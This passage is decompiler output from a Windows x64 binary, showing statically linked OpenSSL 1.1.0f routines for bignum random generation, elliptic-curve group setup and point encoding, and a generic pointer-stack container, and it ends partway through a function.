__int64 __fastcall sub_140028040(__int64 a1, __int64 a2, __int64 a3, char *a4, size_t a5, int *a6)
{
  unsigned int v10; // edi
  unsigned int v11; // esi
  _BYTE *v12; // rbp
  unsigned int v13; // ecx
  __int64 v14; // rbx
  unsigned int v15; // ebx
  unsigned int v17; // [rsp+30h] [rbp-228h] BYREF
  int *v18; // [rsp+38h] [rbp-220h]
  char v19[224]; // [rsp+40h] [rbp-218h] BYREF
  char v20[96]; // [rsp+120h] [rbp-138h] BYREF
  char v21[64]; // [rsp+180h] [rbp-D8h] BYREF
  char Src[64]; // [rsp+1C0h] [rbp-98h] BYREF

  v18 = a6;
  v10 = 0;
  v11 = (int)(sub_140027260(a2) + 7) / 8 + 8;
  v12 = sub_14001D8E0(v11);
  if ( v12 )
  {
    v13 = 8 * *(_DWORD *)(a3 + 8);
    if ( v13 <= 0x60 )
    {
      v14 = v13;
      memmove(v20, *(const void **)a3, v13);
      memset(&v20[v14], 0, 96 - v14);
      v17 = 0;
      if ( v11 )
      {
        while ( (unsigned int)sub_140025460((__int64)v21, 0x40u) == 1 )
        {
          sub_140042980((__int64)v19);
          sub_140042A10((__int64)v19, (char *)&v17, 4ui64);
          sub_140042A10((__int64)v19, v20, 0x60ui64);
          sub_140042A10((__int64)v19, a4, a5);
          sub_140042A10((__int64)v19, v21, 0x40ui64);
          sub_1400423F0(Src, (__int64)v19);
          v15 = v11 - v17;
          if ( v11 - v17 > 0x40 )
            v15 = 64;
          memmove(&v12[v17], Src, v15);
          v17 += v15;
          if ( v17 >= v11 )
            goto LABEL_9;
        }
      }
      else
      {
LABEL_9:
        if ( sub_140026840(v12, v11, a1) && (unsigned int)sub_140041D70(0i64, a1, a1, a2, v18) == 1 )
          v10 = 1;
      }
    }
    else
    {
      sub_140024610(3, 140, 117, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bn\\bn_rand.c", 225);
    }
  }
  sub_14001D930(v12);
  sub_140023440((__int64)v20, 96i64);
  return v10;
}
// 140028040: using guessed type char var_138[96];

//----- (0000000140028290) ----------------------------------------------------
__int64 __fastcall sub_140028290(__int64 a1, int a2, int a3, int a4)
{
  int v4; // eax

  return sub_140028500(v4 - 55, a1, a2, a3, a4);
}
// 1400282AB: variable 'v4' is possibly undefined

//----- (00000001400282C0) ----------------------------------------------------
__int64 __fastcall sub_1400282C0(__int64 a1, __int64 a2)
{
  int v2; // eax

  return sub_140028330(v2 - 39, a1, a2);
}
// 1400282D3: variable 'v2' is possibly undefined

//----- (00000001400282E0) ----------------------------------------------------
__int64 __fastcall sub_1400282E0(__int64 a1, int a2, int a3, int a4)
{
  return sub_140028500(0, a1, a2, a3, a4);
}

//----- (0000000140028310) ----------------------------------------------------
__int64 __fastcall sub_140028310(__int64 a1, __int64 a2)
{
  return sub_140028330(0, a1, a2);
}

//----- (0000000140028330) ----------------------------------------------------
__int64 __fastcall sub_140028330(int a1, __int64 a2, __int64 a3)
{
  __int64 (__fastcall *v3)(__int64, int, int, int); // r14
  int v6; // esi
  int v7; // eax
  int v8; // ebp

  v3 = sub_1400282E0;
  if ( a1 )
    v3 = sub_140028290;
  v6 = 100;
  if ( *(_DWORD *)(a3 + 16) || sub_140027160(a3) )
  {
    sub_140024610(3, 122, 115, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bn\\bn_rand.c", 120);
    return 0i64;
  }
  else
  {
    v7 = sub_140027260(a3);
    v8 = v7;
    if ( v7 == 1 )
    {
      sub_140027560(a2, 0i64);
      return 1i64;
    }
    else
    {
      if ( (unsigned int)sub_1400270A0(a3, v7 - 2) || (unsigned int)sub_1400270A0(a3, v8 - 3) )
      {
        while ( (unsigned int)v3(a2, v8, -1, 0) )
        {
          if ( !--v6 )
          {
            sub_140024610(3, 122, 113, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bn\\bn_rand.c", 166);
            return 0i64;
          }
          if ( (int)sub_140026AB0(a2, (__int64 *)a3) < 0 )
            return 1i64;
        }
      }
      else
      {
        while ( (unsigned int)v3(a2, v8 + 1, -1, 0)
             && ((int)sub_140026AB0(a2, (__int64 *)a3) < 0
              || (unsigned int)sub_140041AC0(a2, a2, a3)
              && ((int)sub_140026AB0(a2, (__int64 *)a3) < 0 || (unsigned int)sub_140041AC0(a2, a2, a3))) )
        {
          if ( !--v6 )
          {
            sub_140024610(3, 122, 113, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bn\\bn_rand.c", 153);
            return 0i64;
          }
          if ( (int)sub_140026AB0(a2, (__int64 *)a3) < 0 )
            return 1i64;
        }
      }
      return 0i64;
    }
  }
}

//----- (0000000140028500) ----------------------------------------------------
__int64 __fastcall sub_140028500(int a1, __int64 a2, int a3, int a4, int a5)
{
  unsigned int v5; // r12d
  int v9; // ebp
  int v10; // esi
  _BYTE *v11; // rdi
  __int64 v12; // rbx
  __time64_t Time; // [rsp+38h] [rbp-40h] BYREF
  unsigned __int8 v15; // [rsp+90h] [rbp+18h] BYREF

  v5 = 0;
  if ( !a3 )
  {
    if ( a4 == -1 && !a5 )
    {
      sub_140027560(a2, 0i64);
      return (unsigned int)(a4 + 2);
    }
    goto LABEL_33;
  }
  if ( a3 < 0 || a3 == 1 && a4 > 0 )
  {
LABEL_33:
    sub_140024610(3, 127, 118, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bn\\bn_rand.c", 92);
    return 0i64;
  }
  v9 = (a3 + 7) / 8;
  v10 = (a3 - 1) % 8;
  v11 = sub_14001D8E0(v9);
  if ( v11 )
  {
    time64(&Time);
    sub_140025410((__int64)&Time, 8u);
    if ( (int)sub_140025460((__int64)v11, v9) > 0 )
    {
      if ( a1 == 2 && (v12 = 0i64, v9 > 0i64) )
      {
        while ( (int)sub_140025460((__int64)&v15, 1u) > 0 )
        {
          if ( v15 < 0x80u || v12 <= 0 )
          {
            if ( v15 >= 0x2Au )
            {
              if ( v15 < 0x54u )
                v11[v12] = -1;
            }
            else
            {
              v11[v12] = 0;
            }
          }
          else
          {
            v11[v12] = v11[v12 - 1];
          }
          if ( ++v12 >= v9 )
            goto LABEL_22;
        }
      }
      else
      {
LABEL_22:
        if ( a4 >= 0 )
        {
          if ( a4 )
          {
            if ( v10 )
            {
              *v11 |= 3 << (v10 - 1);
            }
            else
            {
              v11[1] |= 0x80u;
              *v11 = 1;
            }
          }
          else
          {
            *v11 |= 1 << v10;
          }
        }
        *v11 &= ~(unsigned __int8)(255 << (v10 + 1));
        if ( a5 )
          v11[v9 - 1] |= 1u;
        if ( sub_140026840(v11, v9, a2) )
          v5 = 1;
      }
    }
  }
  else
  {
    sub_140024610(3, 127, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bn\\bn_rand.c", 38);
  }
  sub_14001DA40(v11, v9, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\bn\\bn_rand.c", 0x57u);
  return v5;
}

//----- (0000000140028760) ----------------------------------------------------
unsigned __int64 __fastcall sub_140028760(int a1)
{
  unsigned __int64 result; // rax
  _DWORD *v3; // rcx
  __int64 v4; // rax
  __int128 v5; // xmm1
  __int64 *v6; // rax
  __int64 *v7; // rdi
  __int128 v8[2]; // [rsp+30h] [rbp-28h] BYREF

  result = 0i64;
  if ( a1 > 0 )
  {
    v3 = &unk_1400DA6D0;
    while ( *v3 != a1 )
    {
      ++result;
      v3 += 8;
      if ( result >= 0x51 )
        goto LABEL_7;
    }
    v4 = 32 * result;
    v5 = *(_OWORD *)((char *)&unk_1400DA6D0 + v4 + 16);
    v8[0] = *(_OWORD *)((char *)&unk_1400DA6D0 + v4);
    v8[1] = v5;
    v6 = sub_1400288D0((__int64)v8);
    v7 = v6;
    if ( !v6 )
    {
LABEL_7:
      sub_140024610(16, 174, 129, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_curve.c", 3100);
      return 0i64;
    }
    sub_140021E20((__int64)v6, a1);
    return (unsigned __int64)v7;
  }
  return result;
}

//----- (0000000140028820) ----------------------------------------------------
char *__fastcall sub_140028820(int a1)
{
  __int64 v1; // rax
  _DWORD *i; // rdx

  v1 = 0i64;
  for ( i = &unk_140134FF8; *i != a1; i += 4 )
  {
    if ( (unsigned __int64)++v1 >= 0xF )
      return 0i64;
  }
  return (&off_140134FF0)[2 * v1];
}
// 140134FF0: using guessed type char *off_140134FF0;

//----- (0000000140028860) ----------------------------------------------------
__int64 __fastcall sub_140028860(__int64 a1)
{
  char **v2; // r10
  unsigned __int64 v3; // r9
  char *v4; // rax
  int v5; // ecx
  int v6; // edx

  v2 = &off_140134FF0;
  v3 = 0i64;
  while ( 1 )
  {
    v4 = *v2;
    do
    {
      v5 = (unsigned __int8)v4[a1 - (_QWORD)*v2];
      v6 = (unsigned __int8)*v4 - v5;
      if ( v6 )
        break;
      ++v4;
    }
    while ( v5 );
    if ( !v6 )
      break;
    ++v3;
    v2 += 2;
    if ( v3 >= 0xF )
      return 0i64;
  }
  return LODWORD((&off_140134FF0)[2 * v3 + 1]);
}
// 140134FF0: using guessed type char *off_140134FF0;

//----- (00000001400288D0) ----------------------------------------------------
__int64 *__fastcall sub_1400288D0(__int64 a1)
{
  __int64 v1; // rbx
  __int64 *v3; // rdi
  _DWORD *v4; // r13
  _DWORD *v5; // r14
  __int64 (*v6)(void); // rax
  _QWORD *v8; // r12
  _DWORD *v9; // r15
  __int64 v10; // r14
  _BYTE *v11; // rbp
  __int64 (__fastcall *v12)(_DWORD *); // rax
  __int64 v13; // rax
  __int64 *v14; // rax
  _QWORD *v15; // rsi
  _DWORD *v16; // [rsp+30h] [rbp-58h]
  int v17; // [rsp+90h] [rbp+8h]
  __int64 *v18; // [rsp+98h] [rbp+10h]
  _DWORD *v19; // [rsp+A0h] [rbp+18h]
  _DWORD *v20; // [rsp+A8h] [rbp+20h]

  v1 = 0i64;
  v3 = 0i64;
  v18 = 0i64;
  v4 = 0i64;
  v19 = 0i64;
  v5 = 0i64;
  v20 = 0i64;
  v16 = 0i64;
  if ( *(_QWORD *)(a1 + 8) )
  {
    v8 = sub_140027CD0();
    if ( !v8 )
    {
      sub_140024610(16, 175, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_curve.c", 2998);
LABEL_36:
      v15 = 0i64;
      goto LABEL_37;
    }
    v9 = *(_DWORD **)(a1 + 8);
    v10 = (int)v9[2];
    v11 = (char *)v9 + v9[1] + 16;
    v17 = v9[1];
    v18 = (__int64 *)sub_140026840(v11, v9[2], 0i64);
    if ( !v18
      || (v19 = (_DWORD *)sub_140026840(&v11[v10], v10, 0i64)) == 0i64
      || (v20 = (_DWORD *)sub_140026840(&v11[2 * (int)v10], v10, 0i64)) == 0i64 )
    {
      sub_140024610(16, 175, 3, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_curve.c", 3011);
      goto LABEL_35;
    }
    v12 = *(__int64 (__fastcall **)(_DWORD *))(a1 + 16);
    if ( v12 )
    {
      v13 = v12(v20);
      v14 = sub_140021BE0(v13);
      v3 = v14;
      if ( !v14
        || !(*(unsigned int (__fastcall **)(__int64 *, __int64 *, _DWORD *, _DWORD *, _QWORD *))(*v14 + 40))(
              v14,
              v18,
              v19,
              v20,
              v8) )
      {
        sub_140024610(16, 175, 16, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_curve.c", 3019);
LABEL_35:
        v5 = 0i64;
        goto LABEL_36;
      }
    }
    else if ( *v9 == 406 )
    {
      v3 = sub_1400447B0(v18);
      if ( !v3 )
      {
        sub_140024610(16, 175, 16, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_curve.c", 3024);
        goto LABEL_35;
      }
    }
    else
    {
      v3 = sub_140044720();
      if ( !v3 )
      {
        sub_140024610(16, 175, 16, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_curve.c", 3033);
        goto LABEL_35;
      }
    }
    v15 = sub_140022670(v3);
    if ( v15 )
    {
      v4 = (_DWORD *)sub_140026840(&v11[3 * (int)v10], v10, 0i64);
      if ( v4 && (v16 = (_DWORD *)sub_140026840(&v11[4 * (int)v10], v10, 0i64)) != 0i64 )
      {
        if ( (unsigned int)sub_1400228F0((__int64)v3, v15) )
        {
          v5 = (_DWORD *)sub_140026840(&v11[5 * (int)v10], v10, 0i64);
          if ( v5 && (unsigned int)sub_140027560((__int64)v4, (unsigned int)v9[3]) )
          {
            if ( (unsigned int)sub_140021E30(v3, v15, (__int64)v5, (__int64)v4) )
            {
              if ( !v17 || sub_140021F40((__int64)v3, &v11[-v17], v17) )
                goto LABEL_38;
              sub_140024610(16, 175, 16, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_curve.c", 3064);
            }
            else
            {
              sub_140024610(16, 175, 16, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_curve.c", 3059);
            }
          }
          else
          {
            sub_140024610(16, 175, 3, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_curve.c", 3055);
          }
        }
        else
        {
          sub_140024610(16, 175, 16, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_curve.c", 3050);
          v5 = 0i64;
        }
      }
      else
      {
        sub_140024610(16, 175, 3, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_curve.c", 3046);
        v5 = 0i64;
      }
    }
    else
    {
      sub_140024610(16, 175, 16, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_curve.c", 3040);
      v5 = 0i64;
    }
LABEL_37:
    sub_140021910(v3);
    v3 = 0i64;
LABEL_38:
    sub_1400222C0(v15);
    sub_140027BE0((__int64)v8);
    sub_140026FF0(v18);
    sub_140026FF0(v19);
    sub_140026FF0(v20);
    sub_140026FF0(v5);
    sub_140026FF0(v4);
    sub_140026FF0(v16);
    return v3;
  }
  v6 = *(__int64 (**)(void))(a1 + 16);
  if ( v6 )
    v1 = v6();
  return sub_140021BE0(v1);
}

//----- (0000000140028D30) ----------------------------------------------------
__int64 __fastcall sub_140028D30(__int64 *a1, _QWORD *a2, _BYTE *a3, __int64 a4, int *a5)
{
  __int64 v5; // rax
  __int64 (*v6)(void); // r10

  v5 = *a1;
  v6 = *(__int64 (**)(void))(*a1 + 168);
  if ( v6 || (*(_BYTE *)v5 & 1) != 0 )
  {
    if ( v5 == *a2 )
    {
      if ( (*(_BYTE *)v5 & 1) != 0 )
      {
        if ( *(_DWORD *)(v5 + 4) == 406 )
          return sub_140044850(a1, a2, a3, a4, a5);
        else
          return sub_1400451D0((__int64)a1, a2, a3, a4, a5);
      }
      else
      {
        return v6();
      }
    }
    else
    {
      sub_140024610(16, 122, 101, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_oct.c", 127);
      return 0i64;
    }
  }
  else
  {
    sub_140024610(16, 122, 66, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_oct.c", 123);
    return 0i64;
  }
}

//----- (0000000140028DE0) ----------------------------------------------------
__int64 __fastcall sub_140028DE0(__int64 a1, _QWORD *a2, int a3, _QWORD *a4, int *a5)
{
  __int64 result; // rax
  unsigned __int64 v10; // rdi
  _BYTE *v11; // rbx

  result = sub_140028EA0(a1, a2, a3, 0i64, 0i64, 0i64);
  v10 = result;
  if ( result )
  {
    v11 = sub_14001D8E0(result);
    if ( !v11 )
      return 0i64;
    result = sub_140028EA0(a1, a2, a3, v11, v10, a5);
    if ( !result )
    {
      sub_14001D930(v11);
      return 0i64;
    }
    *a4 = v11;
  }
  return result;
}

//----- (0000000140028EA0) ----------------------------------------------------
__int64 __fastcall sub_140028EA0(__int64 a1, _QWORD *a2, int a3, _BYTE *a4, unsigned __int64 a5, int *a6)
{
  __int64 v6; // rax
  __int64 (*v7)(void); // r10

  v6 = *(_QWORD *)a1;
  v7 = *(__int64 (**)(void))(*(_QWORD *)a1 + 160i64);
  if ( v7 || (*(_BYTE *)v6 & 1) != 0 )
  {
    if ( v6 == *a2 )
    {
      if ( (*(_BYTE *)v6 & 1) != 0 )
      {
        if ( *(_DWORD *)(v6 + 4) == 406 )
          return sub_140044B00(a1, a2, a3, a4, a5, a6);
        else
          return sub_1400454C0(a1, a2, a3, a4, a5, a6);
      }
      else
      {
        return v7();
      }
    }
    else
    {
      sub_140024610(16, 123, 101, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_oct.c", 97);
      return 0i64;
    }
  }
  else
  {
    sub_140024610(16, 123, 66, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_oct.c", 93);
    return 0i64;
  }
}

//----- (0000000140028F50) ----------------------------------------------------
int *__fastcall sub_140028F50(__int64 *a1, _QWORD *a2, __int64 a3, int a4, int *a5)
{
  __int64 v5; // rax
  __int64 (*v6)(void); // r10

  v5 = *a1;
  v6 = *(__int64 (**)(void))(*a1 + 152);
  if ( v6 || (*(_BYTE *)v5 & 1) != 0 )
  {
    if ( v5 == *a2 )
    {
      if ( (*(_BYTE *)v5 & 1) != 0 )
      {
        if ( *(_DWORD *)(v5 + 4) == 406 )
          return sub_140044DF0(a1, a2, a3, a4, a5);
        else
          return sub_1400457E0((__int64)a1, a2, a3, a4, a5);
      }
      else
      {
        return (int *)v6();
      }
    }
    else
    {
      sub_140024610(16, 186, 101, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_oct.c", 71);
      return 0i64;
    }
  }
  else
  {
    sub_140024610(16, 186, 66, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_oct.c", 66);
    return 0i64;
  }
}

//----- (0000000140029000) ----------------------------------------------------
int *__fastcall sub_140029000(__int64 *a1, _QWORD *a2, __int64 a3, int a4, int *a5)
{
  __int64 v5; // rax
  __int64 (*v6)(void); // r10

  v5 = *a1;
  v6 = *(__int64 (**)(void))(*a1 + 152);
  if ( v6 || (*(_BYTE *)v5 & 1) != 0 )
  {
    if ( v5 == *a2 )
    {
      if ( (*(_BYTE *)v5 & 1) != 0 )
      {
        if ( *(_DWORD *)(v5 + 4) == 406 )
          return sub_140044DF0(a1, a2, a3, a4, a5);
        else
          return sub_1400457E0((__int64)a1, a2, a3, a4, a5);
      }
      else
      {
        return (int *)v6();
      }
    }
    else
    {
      sub_140024610(16, 125, 101, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_oct.c", 35);
      return 0i64;
    }
  }
  else
  {
    sub_140024610(16, 125, 66, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_oct.c", 30);
    return 0i64;
  }
}

//----- (00000001400290B0) ----------------------------------------------------
__int64 __fastcall sub_1400290B0(
        void *a1,
        size_t a2,
        __int64 a3,
        __int64 *a4,
        void (__fastcall *a5)(void *, size_t, void *, size_t *))
{
  __int64 v5; // rax
  unsigned int (__fastcall *v7)(void **, size_t *); // r10
  void *v9; // rdi
  __int64 v10; // rbx
  size_t v11; // r8
  size_t Size[3]; // [rsp+30h] [rbp-18h] BYREF
  size_t v13; // [rsp+58h] [rbp+10h] BYREF
  void *Src; // [rsp+68h] [rbp+20h] BYREF

  v13 = a2;
  v5 = *a4;
  Src = 0i64;
  v7 = *(unsigned int (__fastcall **)(void **, size_t *))(v5 + 72);
  if ( !v7 )
  {
    sub_140024610(16, 246, 152, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_kmeth.c", 135);
    return 0i64;
  }
  if ( a2 <= 0x7FFFFFFF )
  {
    if ( !v7(&Src, Size) )
      return 0i64;
    if ( a5 )
    {
      a5(Src, Size[0], a1, &v13);
      v9 = Src;
      v10 = Size[0];
    }
    else
    {
      v11 = v13;
      v10 = Size[0];
      v9 = Src;
      if ( v13 > Size[0] )
        v11 = Size[0];
      v13 = v11;
      memmove(a1, Src, v11);
    }
    sub_14001DA40(v9, v10, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_kmeth.c", 0x97u);
    return (unsigned int)v13;
  }
  else
  {
    sub_140024610(16, 246, 161, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_kmeth.c", 139);
    return 0i64;
  }
}
// 1400290B0: using guessed type size_t Size[3];

//----- (00000001400291D0) ----------------------------------------------------
char **sub_1400291D0()
{
  return &off_1400DD3A0;
}
// 1400DD3A0: using guessed type char *off_1400DD3A0;

//----- (00000001400291E0) ----------------------------------------------------
__int64 __fastcall sub_1400291E0(__int64 a1)
{
  int v1; // eax
  _DWORD *v3; // rax
  __int64 v4; // rbx
  _DWORD *v6; // rax
  std::ios_base *v7; // rcx
  __int64 v8; // rax
  unsigned int (__fastcall *v9)(__int64); // rdx
  int v10; // [rsp+20h] [rbp-18h]

  v3 = sub_14001DC20((unsigned int)(v1 + 32));
  v4 = (__int64)v3;
  if ( !v3 )
  {
    sub_140024610(16, 245, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_kmeth.c", 78);
    return 0i64;
  }
  v3[14] = 1;
  v6 = sub_140025C10();
  *(_QWORD *)(v4 + 72) = v6;
  if ( !v6 )
  {
    sub_140024610(16, 245, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_kmeth.c", 85);
    sub_14001D930((void *)v4);
    return 0i64;
  }
  *(_QWORD *)v4 = off_1401350E0;
  if ( a1 )
  {
    if ( !(unsigned int)sub_140025980(a1) )
    {
      v10 = 94;
LABEL_8:
      sub_140024610(16, 245, 38, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_kmeth.c", v10);
LABEL_9:
      sub_14001C600(v4);
      return 0i64;
    }
    *(_QWORD *)(v4 + 8) = a1;
  }
  else
  {
    *(_QWORD *)(v4 + 8) = sub_140046D20();
  }
  v7 = *(std::ios_base **)(v4 + 8);
  if ( v7 )
  {
    v8 = std::ios_base::width(v7);
    *(_QWORD *)v4 = v8;
    if ( !v8 )
    {
      v10 = 103;
      goto LABEL_8;
    }
  }
  *(_DWORD *)(v4 + 16) = 1;
  *(_DWORD *)(v4 + 52) = 4;
  if ( !(unsigned int)sub_140026350(8u, v4, (__int64 *)(v4 + 64)) )
    goto LABEL_9;
  v9 = *(unsigned int (__fastcall **)(__int64))(*(_QWORD *)v4 + 16i64);
  if ( v9 && !v9(v4) )
  {
    sub_140024610(16, 245, 70, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_kmeth.c", 117);
    goto LABEL_9;
  }
  return v4;
}
// 1400291FA: variable 'v1' is possibly undefined
// 140046D20: using guessed type __int64 sub_140046D20(void);
// 1401350E0: using guessed type char **off_1401350E0;

//----- (0000000140029370) ----------------------------------------------------
__int64 __fastcall sub_140029370(int *a1, int a2)
{
  int v3; // r8d
  __int64 v4; // r10
  __int64 *v5; // rcx
  __int64 v6; // rdi

  if ( !a1 )
    return 0i64;
  if ( a2 < 0 )
    return 0i64;
  v3 = *a1;
  if ( a2 >= *a1 )
    return 0i64;
  v4 = *((_QWORD *)a1 + 1);
  v5 = (__int64 *)(v4 + 8i64 * a2);
  v6 = *v5;
  if ( a2 != v3 - 1 )
    memmove(v5, (const void *)(v4 + 8i64 * (a2 + 1)), 8i64 * (v3 - a2 - 1));
  --*a1;
  return v6;
}

//----- (00000001400293F0) ----------------------------------------------------
__int64 __fastcall sub_1400293F0(__int64 a1, __int64 a2)
{
  int v2; // r9d
  __int64 v3; // rdi
  int v5; // eax
  _QWORD *v6; // r10
  _QWORD *i; // r8

  v2 = *(_DWORD *)a1;
  v3 = 0i64;
  v5 = 0;
  if ( *(int *)a1 <= 0 )
    return 0i64;
  v6 = *(_QWORD **)(a1 + 8);
  for ( i = v6; *i != a2; ++i )
  {
    if ( ++v5 >= v2 )
      return 0i64;
  }
  if ( v5 >= 0 && v5 < v2 )
  {
    v3 = v6[v5];
    if ( v5 != v2 - 1 )
      memmove(&v6[v5], &v6[v5 + 1], 8i64 * (v2 - v5 - 1));
    --*(_DWORD *)a1;
  }
  return v3;
}

//----- (0000000140029490) ----------------------------------------------------
__int64 __fastcall sub_140029490(int *a1, __int64 a2)
{
  char v2; // al

  return sub_1400298A0(a1, a2, v2 - 38);
}
// 14002949D: variable 'v2' is possibly undefined

//----- (00000001400294B0) ----------------------------------------------------
void __fastcall sub_1400294B0(void **a1)
{
  if ( a1 )
  {
    sub_14001D930(a1[1]);
    sub_14001D930(a1);
  }
}

//----- (0000000140029500) ----------------------------------------------------
__int64 __fastcall sub_140029500(int *a1, __int64 a2, int a3)
{
  __int64 v3; // rsi
  unsigned int v6; // eax
  unsigned __int64 v7; // rcx
  unsigned __int64 v8; // rbx
  void *v9; // rax
  __int64 result; // rax
  __int64 v11; // rcx

  v3 = a3;
  if ( !a1 )
    return 0i64;
  v6 = *a1;
  if ( (unsigned int)*a1 > 0x7FFFFFFE )
    return 0i64;
  v7 = *((_QWORD *)a1 + 3);
  if ( v7 <= (int)(v6 + 1) )
  {
    v8 = 2 * v7;
    if ( 2 * v7 < v7 )
      return 0i64;
    if ( v8 > 0x1FFFFFFFFFFFFFFFi64 )
      return 0i64;
    v9 = sub_14001D970(*((void **)a1 + 1), 16 * v7, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\stack\\stack.c", 0x8Cu);
    if ( !v9 )
      return 0i64;
    *((_QWORD *)a1 + 1) = v9;
    *((_QWORD *)a1 + 3) = v8;
  }
  v11 = *a1;
  if ( (int)v3 >= (int)v11 || (int)v3 < 0 )
  {
    *(_QWORD *)(*((_QWORD *)a1 + 1) + 8 * v11) = a2;
    result = (unsigned int)++*a1;
    a1[4] = 0;
  }
  else
  {
    memmove(
      (void *)(*((_QWORD *)a1 + 1) + 8i64 * ((int)v3 + 1)),
      (const void *)(8 * v3 + *((_QWORD *)a1 + 1)),
      8i64 * ((int)v11 - (int)v3));
    *(_QWORD *)(8 * v3 + *((_QWORD *)a1 + 1)) = a2;
    result = (unsigned int)++*a1;
    a1[4] = 0;
  }
  return result;
}

//----- (0000000140029620) ----------------------------------------------------
__int64 __fastcall sub_140029620(__int64 a1)
{
  __int64 result; // rax

  result = 1i64;
  if ( a1 )
    return *(unsigned int *)(a1 + 16);
  return result;
}

//----- (0000000140029630) ----------------------------------------------------
_QWORD *__fastcall sub_140029630(__int64 a1)
{
  int v1; // eax
  _QWORD *v3; // rbx
  void *v4; // rax
  _QWORD *result; // rax

  v3 = sub_14001DC20((unsigned int)(v1 + 8));
  if ( v3 && (v4 = sub_14001DC20(0x20ui64), (v3[1] = v4) != 0i64) )
  {
    v3[4] = a1;
    result = v3;
    v3[3] = 4i64;
  }
  else
  {
    sub_14001D930(v3);
    return 0i64;
  }
  return result;
}
// 14002964A: variable 'v1' is possibly undefined

//----- (00000001400296C0) ----------------------------------------------------
_QWORD *sub_1400296C0()
{
  return sub_140029630(0i64);
}

//----- (00000001400296E0) ----------------------------------------------------
__int64 __fastcall sub_1400296E0(unsigned int *a1)
{
  if ( a1 )
    return *a1;
  else
    return 0xFFFFFFFFi64;
}

//----- (00000001400296F0) ----------------------------------------------------
__int64 __fastcall sub_1400296F0(int *a1)
{
  if ( a1 && *a1 > 0 )
    return sub_140029370(a1, *a1 - 1);
  else
    return 0i64;
}

//----- (0000000140029720) ----------------------------------------------------
void __fastcall sub_140029720(void *a1, void (*a2)(void))
{
  int v3; // ebx
  __int64 v5; // rdi

  if ( a1 )
  {
    v3 = 0;
    if ( *(int *)a1 > 0 )
    {
      v5 = 0i64;
      do
      {
        if ( *(_QWORD *)(v5 + *((_QWORD *)a1 + 1)) )
          a2();
        ++v3;
        v5 += 8i64;
      }
      while ( v3 < *(_DWORD *)a1 );
    }
    sub_14001D930(*((void **)a1 + 1));
    sub_14001D930(a1);
  }
}

//----- (00000001400297C0) ----------------------------------------------------
__int64 __fastcall sub_1400297C0(int *a1, __int64 a2)
{
  return sub_140029500(a1, a2, *a1);
}

//----- (00000001400297E0) ----------------------------------------------------
__int64 __fastcall sub_1400297E0(__int64 a1, int a2, __int64 a3)
{
  if ( !a1 || a2 < 0 || a2 >= *(_DWORD *)a1 )
    return 0i64;
  *(_QWORD *)(8i64 * a2 + *(_QWORD *)(a1 + 8)) = a3;
  return *(_QWORD *)(8i64 * a2 + *(_QWORD *)(a1 + 8));
}

//----- (0000000140029810) ----------------------------------------------------
__int64 __fastcall sub_140029810(__int64 a1, __int64 a2)
{
  __int64 result; // rax

  result = *(_QWORD *)(a1 + 32);
  *(_QWORD *)(a1 + 32) = a2;
  if ( result != a2 )
    *(_DWORD *)(a1 + 16) = 0;
  return result;
}

//----- (0000000140029830) ----------------------------------------------------
void __fastcall sub_140029830(int *a1)
{
  int v1; // eax
  int (__cdecl *v3)(const void *, const void *); // r9

  if ( a1 && !a1[4] )
  {
    v3 = (int (__cdecl *)(const void *, const void *))*((_QWORD *)a1 + 4);
    if ( v3 )
    {
      qsort(*((void **)a1 + 1), *a1, (unsigned int)(v1 - 24), v3);
      a1[4] = 1;
    }
  }
}
// 140029858: variable 'v1' is possibly undefined

//----- (0000000140029880) ----------------------------------------------------
__int64 __fastcall sub_140029880(__int64 a1, int a2)
{
  if ( a1 && a2 >= 0 && a2 < *(_DWORD *)a1 )
    return *(_QWORD *)(*(_QWORD *)(a1 + 8) + 8i64 * a2);
  else
    return 0i64;
}

//----- (00000001400298A0) ----------------------------------------------------
__int64 __fastcall sub_1400298A0(int *a1, __int64 a2, char a3)
{
  int (__cdecl *v5)(const void *, const void *); // r9
  int v6; // r8d
  __int64 result; // rax
  _QWORD *i; // rcx
  __int64 v9; // rax
  __int64 v10; // [rsp+48h] [rbp+10h] BYREF

  v10 = a2;
  if ( !a1 )
    return 0xFFFFFFFFi64;
  v5 = (int (__cdecl *)(const void *, const void *))*((_QWORD *)a1 + 4);
  if ( v5 )
  {
    if ( !a1[4] )
    {
      qsort(*((void **)a1 + 1), *a1, 8ui64, v5);
